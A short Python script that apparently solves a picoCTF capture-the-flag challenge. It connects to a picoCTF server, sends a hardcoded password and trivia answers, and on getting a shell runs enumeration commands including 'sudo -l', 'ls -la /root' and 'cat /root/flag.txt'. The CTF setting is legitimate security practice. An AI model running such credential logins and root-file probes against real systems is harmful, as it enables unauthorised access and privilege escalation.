#!/usr/bin/env python3
import socket
import time
import select

# Connect to the server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('tethys.picoctf.net', 59853))
sock.setblocking(0)

def read_available():
    """Read all available data"""
    data = b''
    while True:
        ready = select.select([sock], [], [], 0.5)
        if ready[0]:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        else:
            break
    return data.decode()

# Receive initial banner
time.sleep(1)
print(read_available())

# Send password
sock.sendall(b'My_Passw@rd_@1234\n')
time.sleep(1)
print(read_available())

# Send conference answer
sock.sendall(b'DEFCON\n')
time.sleep(1)
print(read_available())

# Send hacker answer
sock.sendall(b'John Draper\n')
time.sleep(2)
output = read_available()
print(output)

# Check if we have a prompt
if 'player@' in output or '$' in output:
    print("\n*** GOT SHELL! ***\n")
    
    # Try commands
    commands = [b'whoami\n', b'id\n', b'pwd\n', b'sudo -l\n', b'ls -la /root\n', b'cat /root/flag.txt\n']
    for cmd in commands:
        sock.sendall(cmd)
        time.sleep(1)
        print(read_available())
else:
    print("\n*** NO SHELL - Connection might be closed ***\n")
    # Try to send a command anyway
    time.sleep(1)
    try:
        sock.sendall(b'whoami\n')
        time.sleep(2)
        print(read_available())
    except Exception as e:
        print(f"Error: {e}")

sock.close()
